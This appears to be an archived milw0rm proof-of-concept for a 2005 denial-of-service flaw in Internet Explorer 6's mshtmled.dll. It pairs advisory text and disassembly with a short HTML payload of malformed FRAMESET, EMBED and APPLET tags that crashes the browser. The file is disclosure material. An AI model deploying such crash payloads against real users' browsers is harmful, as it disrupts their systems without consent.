@@ -1,0 +1,61 @@
+<!--
+
+Internet Explorer 'mshtmled.dll' 6.0 Denial Of Service
+
+Release Date:
+October 24, 2005
+
+Date Reported:
+August 14, 2005
+
+Severity:
+Medium
+
+Vendor:
+Microsoft
+
+Versions Affected:
+Internet Explorer 6.0 on Windows XP SP2
+
+Overview:
+A denial of service vulnerability exists within Internet Explorer 6.0 on XP SP2 with the J2SE Runtime Environment installed allows for an attacker to cause the browser to stop responding.
+
+Technical Details:
+The flaw is within mshtmled.dll (6.00.2900.2753 (xpsp_sp2_gdr.050902-1326) and prior versions) which Internet Explorer 6.0 uses for HTML editing. Below is a snippet from mshtmled.dll which is causing the problem. From what is looks like, this is just a null pointer issue.
+
+.text:76235680 loc_76235680: ; CODE XREF: sub_762355EC+56 j
+.text:76235680 ; sub_762355EC+62 j ...
+.text:76235680 mov eax, [esi+8]
+.text:76235683 lea ecx, [eax+10h]
+.text:76235686 mov eax, [ecx] ; <(=--- oops
+.text:76235688 call dword ptr [eax+0Ch]
+.text:7623568B mov ecx, [eax]
+
+The following code below will reproduce this issue. Please note that you must have J2SE Runtime Environment installed which is located here:
+
+http://www.java.com/en/download/windows_automatic.jsp
+
+-->
+
+<META HTTP-EQUIV="Refresh" content="0;URL=http://www.milw0rm.com/exploit.php?id=1276">
+<FRAMESET >
+<FRAME SRC=AAAA >
+<EMBED NAME=SP STYLE= >
+<APPLET HSPACE=file:\\ >
+
+<!--
+
+Vendor Status:
+Ask Microsoft.
+
+Discovered by:
+Tom Ferris
+
+Related Links:
+www.security-protocols.com/poc/sp-x20.html
+www.security-protocols.com/advisory/sp-x20-advisory.txt
+www.evolvesecurity.com
+
+// commented the advisory for exploit testing /str0ke -->
+
+# milw0rm.com [2005-10-28]
